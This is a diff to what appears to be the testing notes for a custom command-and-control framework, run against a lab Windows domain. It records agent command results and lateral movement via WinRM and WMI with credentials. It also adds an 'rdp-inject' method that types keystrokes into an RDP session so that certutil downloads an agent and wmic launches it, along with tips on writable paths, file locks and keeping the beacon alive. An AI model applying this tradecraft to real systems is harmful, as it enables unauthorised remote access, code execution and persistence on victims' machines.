@@ -13,7 +13,7 @@ Agent binaries: ag4.exe=Go(PID 7128), an.exe=Nim, ac2.exe=C, ar3.exe=Rust
 
 | Command | Result |
 |---------|--------|
-| `sysinfo` | `hostname=castelblack user=localuser os=windows/amd64 pid=7128` |
+| `sysinfo` | `hostname=castelblack user=localuser os=windows/amd64 pid=7128` (Go); C agent → `hostname=castelblack user=NORTH\jon.snow` (lowercase host, DOMAIN\user after GetUserNameExA fix) |
 | `ps` | 231 processes listed; lsass=596, MsMpEng=2892, agent_c=716 |
 | `getpid` | `7128` (ag4.exe Go agent) |
 | `ppid` | `4920` |
@@ -173,6 +173,15 @@ Files must be in `data/uploads/` on C2 server.
 | `jump winrm CASTELBLACK ag4.exe localuser password` | lateral via WinRM |
 | `jump wmi CASTELBLACK ag4.exe localuser password` | lateral via WMI Win32_Process |
 | `winrm exec CASTELBLACK localuser password whoami` | single command via WinRM |
+| `rdp-inject` (GUI: Internal Pentest → password auth) | xdotool Win+X→Run→certutil download→wmic execute; spawns agent as NORTH\jon.snow in RDP session |
+
+**rdp-inject notes (verified 2026-07-29):**
+- Download path must be `C:\Users\Public\` — `C:\Windows\Temp\` requires local admin, non-admin users (jon.snow) get EACCES and certutil silently writes nothing
+- wmic path must use **backslashes**: `wmic process call create C:\Users\Public\agent.exe` — wmic treats `/` as flag prefix → "Invalid Verb Switch" silent failure
+- `_x` suffix on filename avoids file-lock if same binary already running (e.g. `agent_https_go_x.exe`)
+- Agent spawns in RDP Session 3 (not Session 0); session stays alive after xfreerdp disconnect
+- 45s sleep window between certutil download and xfreerdp kill lets the beacon fire
+- Verified: agent b9f522d7 registered as NORTH\jon.snow, PID 3004, castelblack ✓
 
 ---
 
@@ -390,7 +399,7 @@ fork-run <cmd> <shellcode_file>        # spawn suspended, inject shellcode, redi
 - nim_v12 agent: 5ba2f66f (CASTELBLACK, PID 2092) ✓
 - c_v14 agent: checked in after upload via nim_v12 ✓
 
-*Last updated: 2026-07-28*
+*Last updated: 2026-07-30*
 
 ---
 
